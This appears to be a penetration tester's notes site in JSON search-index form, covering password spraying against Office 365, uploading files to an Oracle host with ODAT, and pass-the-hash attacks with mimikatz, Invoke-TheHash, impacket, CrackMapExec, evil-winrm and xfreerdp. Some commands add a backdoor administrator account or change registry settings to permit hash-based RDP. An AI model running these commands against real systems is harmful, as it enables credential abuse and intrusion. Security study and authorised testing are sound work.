SYSTEM-level access on a host, including but not limited to:</p> <ul> <li>Remote Windows exploits such as EternalBlue or BlueKeep.</li> <li>Abusing a service running in the context of the SYSTEM account.</li> <li>Abusing SeImpersonate privileges using RottenPotatoNG against older Windows systems, Juicy Potato, or PrintSpoofer if targeting Windows 10/Windows Server 2019.</li> <li>Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0day.</li> <li>PsExec with the <code>-s</code> flag</li> </ul>","tags":["active directory","ldap","windows"]},{"location":"o365spray/","title":"O365spray","text":"<p>O365spray\u00a0is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by\u00a0ZDH. This tool reimplements a collection of enumeration and spray techniques researched.</p>","tags":["pentesting","enumeration","tools","msoffice","SMTP"]},{"location":"o365spray/#installation","title":"Installation","text":"<p>Repo: https://github.com/0xZDH/o365spray</p> <pre><code>git clone https://github.com/0xZDH/o365spray\ncd o365spray\nsudo pip install -r requirements.txt\n</code></pre>","tags":["pentesting","enumeration","tools","msoffice","SMTP"]},{"location":"o365spray/#basic-usage","title":"Basic usage","text":"<p>User enumeration:</p> <pre><code># First validate if our target domain is using Office 365.\npython3 o365spray.py --validate --domain msexample.com\n\n# Attempt to identify usernames.\npython3 o365spray.py --enum -U users.txt --domain msexample.com\n</code></pre> <pre><code>python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msexample.com\n</code></pre>","tags":["pentesting","enumeration","tools","msoffice","SMTP"]},{"location":"objection/","title":"Objection","text":"<p>What it does? It makes a regular ADB connection ant start the frida server in the device. If you are using a rooted device it is needed to select the application that you want to test inside the --gadget option.</p>","tags":["mobile pentesting"]},{"location":"objection/#installation","title":"Installation","text":"<pre><code>pip3 install objection\n</code></pre>","tags":["mobile pentesting"]},{"location":"objection/#usage","title":"Usage","text":"<p>What it does? It makes a regular ADB connection ant start the frida server in the device. If you are using a rooted device it is needed to select the application that you want to test inside the --gadget option.</p> <p>In the metromadrid app, this would be:</p> <pre><code>objection --gedget es.metromadrid.metroandroid explore\n</code></pre>","tags":["mobile pentesting"]},{"location":"objection/#basic-commands","title":"Basic commands","text":"<pre><code># Some interesting information (like passwords, paths...) could be found inside the environment.\nenv\n\nfile download &lt;remotepath&gt; [&lt;localpath&gt;]\nfile upload &lt;localpath&gt; [&lt;remotepath&gt;]\nimport &lt;localpath frida-script&gt;\n\n# Disable SSL pinning on android devices\nandroid sslpinningdisable\n</code></pre>","tags":["mobile pentesting"]},{"location":"oci-fundamentals-preparation/","title":"Notes","text":"<p>Oci has more than 80 services.</p> <p>Instead of regions and availability zones, in Oracle we have Regions and Availability Domains. Instead of datacenters as next level, we have fault domains.</p> <p></p> <p>Instead of datacenters as next level, we have fault domains.</p> <p></p> <p></p> <p></p>"},{"location":"odat/","title":"odat - Oracle Database Attacking Tool","text":"<p>Oracle Database Attacking Tool (ODAT) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.</p>","tags":["enumeration","snmp","port 161","tools"]},{"location":"odat/#installation","title":"Installation","text":"<p>This script installs the needed packages and tools: </p> <pre><code>#!/bin/bash\n\nsudo apt-get install libaio1 python3-dev alien python3-pip -y\ngit clone https://github.com/quentinhardy/odat.git\ncd odat/\ngit submodule init\nsudo submodule update\nsudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y\npip3 install cx_Oracle\nsudo apt-get install python3-scapy -y\nsudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap\nsudo pip3 install argcomplete &amp;&amp; sudo activate-global-python-argcomplete\n</code></pre> <p>Check installation with:</p> <pre><code>./odat.py -h\n</code></pre>","tags":["enumeration","snmp","port 161","tools"]},{"location":"odat/#basic-usage","title":"Basic usage","text":"<p>We can use the <code>odat.py</code>  from ODAT tool to retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations,...</p> <pre><code>/odat.py all -s $ip\n</code></pre> <p>Upload a web shell to the target: </p> <pre><code># Upload a web shell to the target. This requires the server to run a web server, and we need to know the exact location of the root directory for the webserver.\n\n## 1. Creating a non suspicious web shell \necho \"Oracle File Upload Test\" &gt; testing.txt\n\n## 2. Uploading the shell to linux (/var/www/html) or windows (C:\\\\inetpub\\\\wwwroot):\n./odat.py utlfile -s $ip -d XE -U &lt;user&gt; -P &lt;password&gt; --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt\n\n## 3. Test if the file upload approach worked with curl, or visit via browser.\ncurl -X GET http://$ip/testing.txt\n</code></pre>","tags":["enumeration","snmp","port 161","tools"]},{"location":"odata-pentesting/","title":"Pentesting oData","text":"<p>The Open Data Protocol (OData) is an open web protocol for querying and updating data. OData enables the creation of HTTP-based RESTful2  data services that can be used to publish and edit resources that are identified using uniform resource identifiers (URIs) with simple HTTP messages.</p>","tags":["oData","pentesting","webpentesting","Dynamics"]},{"location":"odata-pentesting/#the-service-metadata-document","title":"The Service Metadata Document","text":"<p>It usually has this syntax:</p> <pre><code>http://localhost:32026/OData/OData.svc/$metadata\n</code></pre> <p>https://infosecwriteups.com/unauthorized-access-to-odata-entities-2k-bounty-from-microsoft-e070b2ef88c2</p> <pre><code>The\u00a0**OData metadata**\u00a0is a data model of the system(consider it as\u00a0**information_schema**\u00a0in relational databases). For each metadata, we have\u00a0**entities**(similar to\u00a0**tables**\u00a0in relational databases) and\u00a0**properties**\u00a0(similar to\u00a0**columns**) as well as the relationship between different entity types. Each entity type has an\u00a0**entity key**\u00a0that is similar to the key in relational databases.\n</code></pre>","tags":["oData","pentesting","webpentesting","Dynamics"]},{"location":"onesixtyone/","title":"onesixtyone - Fast and simple SNMP scanner","text":"<p>See SNMP for details about the protocol.</p>","tags":["enumeration","snmp","port 161","tools"]},{"location":"onesixtyone/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/trailofbits/onesixtyone.</p> <pre><code>sudo apt install onesixtyone\n</code></pre>","tags":["enumeration","snmp","port 161","tools"]},{"location":"onesixtyone/#basic-usage","title":"Basic usage","text":"<pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip\n</code></pre>","tags":["enumeration","snmp","port 161","tools"]},{"location":"openssl/","title":"openSSL - Cryptography and SSL/TLS Toolkit","text":"<p>openSSL Website. </p>","tags":["openssl"]},{"location":"openssl/#basic-usage","title":"Basic usage","text":"<pre><code>openssl s_client -connect target.site:443\nHEAD / HTTP/1.0\n</code></pre> <ul> <li>Create self signed certificates.</li> <li>Encrypt/Decrypt files</li> <li>Generate private/public keys.</li> <li>Encrypt/Decrypt files with public/private keys.</li> </ul> <pre><code># Pwnbox - Create a Self-Signed Certificate\nopenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n\n# Encrypt a file\nopenssl enc -aes-256-cbc -iter 100000 -pbkdf2 -in sourceFile.txt -out outputFile.txt.enc\n# -iter 100000: Optional. Override the default iterations counts with this option.\n# -pbkdf2: Optional. Use the Password-Based Key Derivation Function 2 algorithm.\n\n# Decrypt a file\nopenssl enc -d -aes-256-cbc -iter 100000 -pbkdf2 -in encryptedFile.enc -out outputFile.txt\n\n# Generate private key\nopenssl genrsa -aes256 -out private.pem 2048\n\n# Generate public key\nopenssl rsa -in private.pem -outform PEM -pubout -out public.pem\n\n# Encrypt a file with public key\nopenssl rsautl -encrypt -inkey public.pem -pubin -in file.txt -out file.enc\n# -pubin: Specify the entry parameter\n\n# Decrypt a dile with private key\nopenssl rsautl -decrypt -inkey private.pem -in file.enc -out file.txt\n</code></pre>","tags":["openssl"]},{"location":"openvas/","title":"OpenVAS","text":"<p>OpenVAS by Greenbone Networks is a publicly available open-source vulnerability scanner. OpenVAS can perform network scans, including authenticated and unauthenticated testing.</p> <p>Scans may take 1-2 hours to finish.</p>","tags":["reconnaissance","scanner","vulnerability assessment"]},{"location":"openvas/#installation","title":"Installation","text":"<pre><code># Updating packages\nsudo apt-get update &amp;&amp; apt-get -y full-upgrade\n\n# Install the tool\nsudo apt-get install gvm &amp;&amp; openvas\n\n# Initiate setup process\nsudo gvm-setup\n\n# Check installation\nsudo gvm-check-setup\n\n# Start OpenVAS\nsudo gvm-start\n</code></pre> <p>Openvas stands for Open Vulnerability Assessment Scanner. It's based on assets (not on scans). These assets may be hosts, operating systems, TLS certificates... Scans are called here <code>Tasks</code>.</p>","tags":["reconnaissance","scanner","vulnerability assessment"]},{"location":"openvas/#basic-usage","title":"Basic usage","text":"<pre><code># Start OpenVAS\nsudo gvm-start\n</code></pre> <p>Go to <code>https://$ip:8080</code></p> <p>Documentation.</p> <ul> <li><code>Base</code>: This scan configuration is meant to enumerate information about the host's status and operating system information.    </li> <li><code>Discovery</code>: Enumerate host's services, hardware, accessible ports, and software being used on the system.</li> <li><code>Host Discovery</code>: Whether the host is alive and determines what devices are <code>active</code> on the network.  OpenVAS leverages ping to identify if the host is alive.</li> <li><code>System Discovery</code>: Enumerates the target host further than the 'Discovery Scan' and attempts to identify the operating system and hardware associated with the host.</li> <li><code>Full and fast</code>: This configuration is recommended by OpenVAS as the safest option and leverages intelligence to use the best NVT checks for the host(s) based on the accessible ports.</li> </ul> <p>There are various export formats for reporting purposes, including XML, CSV, PDF, ITG, and TXT. If you choose to export your report out as an XML, you can leverage various XML parsers to view the data in an easier to read format.</p>","tags":["reconnaissance","scanner","vulnerability assessment"]},{"location":"openvas/#reporting","title":"Reporting","text":"<p>See openVAS Reporting.</p>","tags":["reconnaissance","scanner","vulnerability assessment"]},{"location":"openvasreporting/","title":"openVAS Reporting","text":"","tags":["reconnaissance","scanner","vulnerability assessment","reporting"]},{"location":"openvasreporting/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/TheGroundZero/openvasreporting.</p> <pre><code># Install Python3 and pip3 before.\n\n# Clone git repository\ngit clone https://github.com/TheGroundZero/openvasreporting.git\n\n# Install required python packages\ncd openvasreporting\npip3 install pip --upgrade\npip3 install build --upgrade\npython -m build\n\n# Install module\npip3 install dist/OpenVAS_Reporting-X.x.x-py3-xxxx-xxx.whl\n</code></pre> <p>Alternative with pip3</p> <pre><code># Install Python3 and pip3\napt(-get) install python3 python3-pip # Debian\n\n# Install the package\npip3 install OpenVAS-Reporting\n</code></pre>","tags":["reconnaissance","scanner","vulnerability assessment","reporting"]},{"location":"openvasreporting/#basic-usage","title":"Basic usage","text":"<pre><code>python3 -m openvasreporting -i report-2bf466b5-627d-4659-bea6-1758b43235b1.xml -f xlsx\n</code></pre>","tags":["reconnaissance","scanner","vulnerability assessment","reporting"]},{"location":"operating-systems/","title":"Repo for legacy Operating system","text":"","tags":["resources"]},{"location":"operating-systems/#old-version-of-windows","title":"Old version of Windows","text":"<p>From Windows 1.0 DR 5 to nowadays ISOs: https://osvault.weebly.com/windows-beta-repository.html</p>","tags":["resources"]},{"location":"operating-systems/#windows-servers","title":"Windows servers","text":"","tags":["resources"]},{"location":"operating-systems/#-windows-server-2019-httpswwwmicrosoftcomes-esevalcenterdownload-windows-server-2019","title":"- Windows Server 2019: https://www.microsoft.com/es-es/evalcenter/download-windows-server-2019.","text":"","tags":["resources"]},{"location":"ophcrack/","title":"ophcrack - A windows password cracker based on rainbow tables","text":"<p>Ophcrack is a free Windows password cracker based on rainbow tables. It is a very efficient implementation of rainbow tables done by the inventors of the method. It comes with a Graphical User Interface and runs on multiple platforms.</p>","tags":["pentesting","password cracker"]},{"location":"ophcrack/#installation","title":"Installation","text":"<p>Download from https://ophcrack.sourceforge.io/.</p>","tags":["pentesting","password cracker"]},{"location":"osint/","title":"OSINT","text":"","tags":["pentest","information","gathering"]},{"location":"osint/#some-tools","title":"Some tools","text":"<p>We can use a tool such as\u00a0linkedin2username\u00a0to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.</p>","tags":["pentest","information","gathering"]},{"location":"owasp-zap/","title":"OWASP zap","text":"<p>To launch it, run:</p> <pre><code>zaproxy\n</code></pre> <p>You can do several things:</p> <ul> <li>Run an automatic attack.</li> <li>Import your spec.yml file and run an automatic attack.</li> <li>Run a manual attack. </li> </ul> <p>The manual explore option will allow you to perform authenticated scanning. Set the URL to your target, make sure the HUD is enabled, and choose \"Launch Browser\". </p>"},{"location":"owasp-zap/#how-to-run-a-manual-attack","title":"How to run a manual attack","text":"<p>Select \"Continue to your target\". On the right-hand side of the HUD, you can set the Attack Mode to On. This will begin scanning and performing authenticated testing of the target. Now you  perform all the actions (sign up a new user, log  in into the account, modify you avatar, post a comment...).</p> <p>After that, OWASP Zap allows you to narrow the results to your target. How? In the Sites module, right click on your site and select \"Include in context\". After that, click on the icon shaped as a \"target\" to filter out sites by context. </p> <p>With the results, start your analysis and remove false-negative vulnerabilities.</p>"},{"location":"owasp-zap/#certificate-installation","title":"Certificate installation","text":"<p>To get ZAP's certificate, we can go to (<code>Tools&gt;Options&gt;Dynamic SSL Certificate</code>), then click on\u00a0<code>Save</code>. We can also change our certificate by generating a new one with the\u00a0<code>Generate</code>\u00a0button.</p> <p></p> <p>We can install them within Firefox by browsing to\u00a0about:preferences#privacy, scrolling to the bottom, and clicking\u00a0<code>View Certificates</code>. After that, we can select the\u00a0<code>Authorities</code>\u00a0tab, and then click on\u00a0<code>import</code>, and select the downloaded CA certificate.</p>"},{"location":"owasp-zap/#intercept-requests","title":"Intercept requests","text":"<p>In ZAP, interception is off by default, as shown by the green button on the top bar (green indicates that requests can pass and not be intercepted). We can click on this button to turn the Request Interception on or off, or we can use the shortcut [<code>CTRL+B</code>] to toggle it on or off:</p> <p></p>"},{"location":"owasp-zap/#interesting-addons","title":"Interesting addons","text":"<p>Update all your addons when opening ZAP for the first time.</p> <ul> <li>Treetools</li> <li>Reflect</li> <li>Revisit</li> <li>Directory List v.2.3</li> <li>Wappalyzer</li> <li>Python Scripting</li> <li>Passive scanner rules</li> <li>FileUpload</li> <li>Regular Expression tester.</li> </ul>"},{"location":"p0f/","title":"P0f","text":"<p>P0f is a tool that utilizes an array of sophisticated, purely passive traffic fingerprinting mechanisms to identify the players behind any incidental TCP/IP communications (often as little as a single normal SYN) without interfering in any way. Version 3 is a complete rewrite of the original codebase, incorporating a significant number of improvements to network-level fingerprinting, and introducing the ability to reason about application-level payloads (e.g., HTTP).</p>","tags":["scanning","tcp","reconnaissance","passive reconnaissance"]},{"location":"p0f/#installation","title":"Installation","text":"<p>Download from: https://lcamtuf.coredump.cx/p0f3/.</p>","tags":["scanning","tcp","reconnaissance","passive reconnaissance"]},{"location":"p0f/#_1","title":"p0f","text":"","tags":["scanning","tcp","reconnaissance","passive reconnaissance"]},{"location":"pass-the-hash/","title":"Pass The Hash","text":"<p>With NTLM, passwords stored on the server and domain controller are not \"salted,\" which means that an adversary with a password hash can authenticate a session without knowing the original password. A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. </p>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-mimikatz-windows","title":"Pass the Hash with Mimikatz (Windows)","text":"<p>see mimikatz</p> <pre><code># Pass The Hash attack in windows:\n# 1. Run mimikatz\nmimikatz.exe privilege::debug \"sekurlsa::pth /user:&lt;username&gt; /rc4:&lt;NTLM hash&gt; /domain:&lt;DOMAIN&gt; /run:&lt;Command&gt;\" exit\n# sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password\n# /run:&lt;Command&gt;: For example /run:cmd.exe\n# 2. After that, we canuse cmd.exe to execute commands in the user's context. \n</code></pre>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-powershell-invoke-thehash-windows","title":"Pass the Hash with PowerShell Invoke-TheHash (Windows)","text":"<p>See Powershell Invoke-TheHash. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.</p> <p>When using Invoke-TheHash, we have two options: SMB or WMI command execution.</p> <pre><code>cd C:\\tools\\Invoke-TheHash\\\n\nImport-Module .\\Invoke-TheHash.psd1\n</code></pre>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#invoke-thehash-with-smb","title":"Invoke-TheHash with SMB","text":"<pre><code>Invoke-SMBExec -Target $ip -Domain &lt;DOMAIN&gt; -Username &lt;USERNAME&gt; -Hash 64F12CDDAA88057E06A81B54E73B949B -Command \"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add\" -Verbose\n# Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.\n# we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.\n</code></pre> <p>How to generate a reverse shell.</p>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#invoke-thehash-with-wmi","title":"Invoke-TheHash with WMI","text":"<pre><code>Invoke-WMIExec -Target $machineName -Domain &lt;DOMAIN&gt; -Username &lt;USERNAME&gt; -Hash 64F12CDDAA88057E06A81B54E73B949B -Command  \"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add\" \n</code></pre> <p>How to generate a reverse shell.</p>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-impacket-linux","title":"Pass the Hash with Impacket (Linux)","text":"","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-impacket-psexec","title":"Pass the Hash with Impacket PsExec","text":"<pre><code>impacket-psexec &lt;username&gt;@$ip -hashes :30B3783CE2ABF1AF70F77D0660CF3453\n</code></pre>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-impacket-wmiexec","title":"Pass the Hash with impacket-wmiexec","text":"<p>Download from: https://github.com/fortra/impacket/blob/master/examples/wmiexec.py.</p>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-impacket-atexec","title":"Pass the Hash with  impacket-atexec","text":"<p>Download from:  https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py</p>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-impacket-smbexec","title":"Pass the Hash with  impacket-smbexec","text":"<p>Download from: https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py</p>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-crackmapexec-linux","title":"Pass the Hash with CrackMapExec (Linux)","text":"<p>See CrackMapExec</p> <pre><code># Using a hash instead of a password, to authenticate ourselves\ncrackmapexec smb $ip -u &lt;username&gt; -H &lt;hash&gt; -d &lt;DOMAIN&gt;\n\n# Execute commands with flag -x\ncrackmapexec smb $ip/24 -u &lt;Administrator&gt; -d . -H &lt;hash&gt; -x whoami\n</code></pre>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-evil-winrm-linux","title":"Pass the Hash with evil-winrm (Linux)","text":"<p>See evil-winrm.</p> <p>If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.</p> <pre><code>evil-winrm -i $ip -u &lt;username&gt; -H &lt;hash&gt;\n</code></pre>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#pass-the-hash-with-rdp-linux","title":"Pass the Hash with RDP (Linux)","text":"<pre><code>xfreerdp [/d:domain] /u:&lt;username&gt; /pth:&lt;hash&gt; /v:$ip\n# /pth:&lt;hash&gt;   Pass the hash\n</code></pre> <p>Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa</code> with the value of 0. It can be done using the following command:</p> <pre><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre> <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>","tags":["privilege escalation","windows"]},{"location":"pass-the-hash/#uac-limits-pass-the-hash-for-local-accounts","title":"UAC Limits Pass the Hash for Local Accounts","text":"<p>UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code> is set to 0, it means that the built-in local admin account (RID-500, \"Administrator\") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.</p> <p>Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account. \u00b4</p>","tags":["privilege escalation","windows"]},{"location":"pdm/","title":"pdm - A python package and dependency manager","text":""},{"location":"pdm/#installation","title":"Installation","text":"<p>PDM, as described, is a modern Python package and dependency manager supporting the latest PEP standards. But it is more than a package manager. It boosts your development workflow in various aspects. The most significant benefit is it installs and manages packages in a similar way to npm that doesn't need to create a virtualenv at all</p> <pre><code>curl -sSL https://raw.githubusercontent.com/pdm-project/pdm/main/install-pdm.py | python3 -\n</code></pre>"},{"location":"penetration-testing-process/","title":"Penetration Testing Process: A General Approach to the Profession","text":"Sources for these notes <ul> <li>Hack The Box: Penetration Testing Learning Path</li> <li>INE eWPT2 Preparation course</li> </ul> <p>Resources:</p> <ul> <li>https://pentestreports.com/</li> </ul>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#types-of-penetration-testing","title":"Types of Penetration Testing","text":"Type Information Provided <code>Blackbox</code> <code>Minimal</code>. Only the essential information, such as IP addresses and domains, is provided. <code>Greybox</code> <code>Extended</code>. In this case, we are provided with additional information, such as specific URLs, hostnames, subnets, and similar. <code>Whitebox</code> <code>Maximum</code>. Here everything is disclosed to us. This gives us an internal view of the entire structure, which allows us to prepare an attack using internal information. We may be given detailed configurations, admin credentials, web application source code, etc. <code>Red-Teaming</code> May include physical testing and social engineering, among other things. Can be combined with any of the above types. <code>Purple-Teaming</code> It can be combined with any of the above types. However, it focuses on working closely with the defenders.","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#types-of-testing-environments","title":"Types of Testing Environments","text":"<p>Apart from the test method and the type of test, another consideration is what is to be tested, which can be summarized in the following categories:</p> Network Web App Mobile API Thick Clients IoT Cloud Source Code Physical Security Employees Hosts Server Security Policies Firewalls IDS/IPS","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#phases","title":"Phases","text":"","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#pre-engagement","title":"Pre-engagement","text":"<p>The pre-engagement phase of a penetration testing is a crucial step that lays the foundation for a successful and well-planned security assessment. It involves preliminary preparations, understanding project requirements, and obtaining necessary authorizations before initiating the actual testing. During the pre-engagement phase, the penetration tester and the client must discuss and agree upon a number of legal and technical details pertinent to the execution and outcomes of the security assessment.</p> <p>This can be one or more documents with the objective to define the following:</p> <ul> <li>Objectives:: Clearly define the objectives and goals of the penetration test. Understand what the stakeholders aim to achieve through the testing process. </li> <li>Scope of the engagement: Identify the scope of the penetration test, including the specific web applications, URLs, and functionalities to be tested. Define the scope boundaries and limitations, such as which systems or networks are out-of-scope for testing.</li> <li>Timeline &amp; milestones</li> <li>Liabilities &amp; responsibility: Obtain proper authorization from the organization's management or application owners to conduct the penetration test. Ensure that the testing activities comply with any legal or regulatory requirements, and that all relevant permissions are secured.</li> <li>Rules of Engagement (RoE): Establish a set of Rules of Engagement that outline the specific rules, constraints, and guidelines for the testing process. Include details about the testing schedule, testing hours, communication channels, and escalation procedures.</li> <li>Communication and Coordination: Establish clear communication channels with key stakeholders, including IT personnel, development teams, and management. Coordinate with relevant personnel to ensure minimal disruption to the production environment during testing.</li> <li>Expectations and deliverables</li> <li>Statement of work</li> <li>The Scoping Meeting: Conduct a scoping meeting with key stakeholders to discuss the testing objectives, scope, and any specific concerns or constraints. Use this meeting to clarify expectations and ensure everyone is aligned with the testing approach.</li> <li>List of documents so far:</li> </ul> Document Timing for Creation Non-Disclosure Agreement (NDA) After Initial Contact Scoping Questionnaire Before the Pre-Engagement Meeting Scoping Document During the Pre-Engagement Meeting Penetration Testing Proposal (Contract/Scope of Work (SoW)) During the Pre-engagement Meeting Rules of Engagement (RoE) Before the Kick-Off Meeting Contractors Agreement (Physical Assessments) Before the Kick-Off Meeting Reports During and after the conducted Penetration Test <ul> <li>Risk Assessment and Acceptance: Perform a risk assessment to understand the potential impact of the penetration test on the web application and the organization. Obtain management's acceptance of any risks associated with the testing process.</li> <li>Engagement Kick-off: Officially kick-off the penetration test, confirming the start date and timeline with the organization's stakeholders. Share the RoE and any other relevant details with the testing team.</li> </ul>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#information-gathering","title":"Information gathering","text":"<p>We could tell 4 categories:</p> <ul> <li>Open-Source Intelligence</li> <li>Infrastructure Enumeration</li> <li>Service Enumeration</li> <li>Host Enumeration</li> </ul> <p>A different way to approach to footprinting is considering the following layers:</p> Layer Description Information Categories <code>1. Internet Presence</code> Identification of internet presence and externally accessible infrastructure. Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures <code>2. Gateway</code> Identify the possible security measures to protect the company's external and internal infrastructure. Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare <code>3. Accessible Services</code> Identify accessible interfaces and services that are hosted externally or internally. Service Type, Functionality, Configuration, Port, Version, Interface <code>4. Processes</code> Identify the internal processes, sources, and destinations associated with the services. PID, Processed Data, Tasks, Source, Destination <code>5. Privileges</code> Identification of the internal permissions and privileges to the accessible services. Groups, Users, Permissions, Restrictions, Environment <code>6. OS Setup</code> Identification of the internal components and systems setup. OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#cloud-resources","title":"Cloud resources","text":"<p>Often cloud storage is added to the DNS list when used for administrative purposes by other employees.</p> <pre><code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep example.com | cut -d\" \" -f1,4;done\n</code></pre> <p>More ways to find cloud storage:</p> <p>google dork:</p> <pre><code># Google search for AWS\nintext: example.com inurl:amazonaws.com\n\n# Google search for Azure\nintext: example.com inurl:blob.core.windows.net\n</code></pre> <p>Source code from the application: For instance</p> <pre><code>&lt;link rel='dns-prefetch' href=\"//example.blob.core.windows.net\"&gt;\n</code></pre> <p>domain.glass service also provides cloud search services for a passive reconnaissance.</p> <p>GrayHatWarfare is also noticeable. With this tool you can filter private and public keys leaked.</p>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#vulnerability-assessment","title":"Vulnerability assessment","text":"<p>During the <code>vulnerability assessment</code> phase, we examine and analyze the information gathered during the information gathering phase. In <code>Vulnerability Research</code>, we look for known vulnerabilities, exploits, and security holes that have already been discovered and reported. After that, we should mirror the target system locally as precisely as possible to replicate our testing locally.</p> <p>The purpose of a <code>Vulnerability Assessment</code> is to understand, identify, and categorize the risk for the more apparent issues present in an environment without actually exploiting them to gain further access.</p> <p>Types of tests: black box, gray box and white box.</p> <p>Specializations: </p> <ul> <li>Application pentesters.</li> <li>Network or infraestructure pentesters.</li> <li>Physical pentesters.</li> <li>Social engineering pentesters.</li> </ul> <p>Types of Security assessments:</p> <ul> <li>Vulnerability assessment.</li> <li>Penetration test.</li> <li>Security audits.</li> <li>Bug bounties. </li> <li>Red team assessments.</li> <li>Purple team assessments.</li> </ul> <p><code>Vulnerability Assessments</code> and Penetration Tests are two completely different assessments. Vulnerability assessments look for vulnerabilities in networks without simulating cyber attacks. <code>Penetration tests</code>, depending on their type, evaluate the security of different assets and the impact of the issues present in the environment. </p> <p> Source: HTB Academy and predatech.co.uk</p> <p>Compliance standards</p> <ul> <li>Payment Card Industry Data Security Standard (PCI DSS).</li> <li>Health Insurance Portability and Accountability Act (HIPAA).</li> <li>Federal Information Security Management Act (FISMA).</li> <li>ISO 27001.</li> <li>The <code>NIST</code> (<code>National Institute of Standards and Technology</code>) is well known for their NIST Cybersecurity Framework.</li> <li><code>OWASP</code> stands for the Open Web Application Security Project:<ul> <li>Web Security Testing Guide (WSTG)</li> <li>Mobile Security Testing Guide (MSTG)</li> <li>Firmware Security Testing Methodology</li> </ul> </li> </ul> <p>Frameworks for Pentesting:</p> <ul> <li>Penetration Testing Execution Standard (<code>PTES</code>). </li> <li><code>Open Source Security Testing Methodology Manual</code> (OSSTMM).</li> <li>Common Vulnerability Scoring System (CVSS).</li> <li>Common Vulneravilities and Exposures.</li> </ul> <p>Scanners: OpenVAS, Nessus, Nexpose, and Qualys.</p>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#exploitation","title":"Exploitation","text":"<p>Once we have set up the system locally and installed known components to mirror the target environment as closely as possible, we can start preparing the exploit by following the steps described in the exploit. Then we test this on a locally hosted VM to ensure it works and does not damage significantly.</p> <ul> <li>Transferring File Techniques: Linux.</li> <li>Transferring File Techniques: Windows</li> <li>Transferring files with code.</li> <li>File Encryption: windows and linux .</li> <li>LOLbins - \"Living off the land\" binaries: LOLbas and GTFObins.</li> <li>Evading detection in file transfers.</li> </ul>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#post-exploitation","title":"Post-exploitation","text":"<p>The <code>Post-Exploitation</code> stage aims to obtain sensitive and security-relevant information from a local perspective and business-relevant information that, in most cases, requires higher privileges than a standard user. This stage includes the following components:</p> <ul> <li>Evasive Testing: watch out with running commands such as net user or whoami that is often monitored by EDR systems and flagged as anomalous activity. Three methods: Evasive, 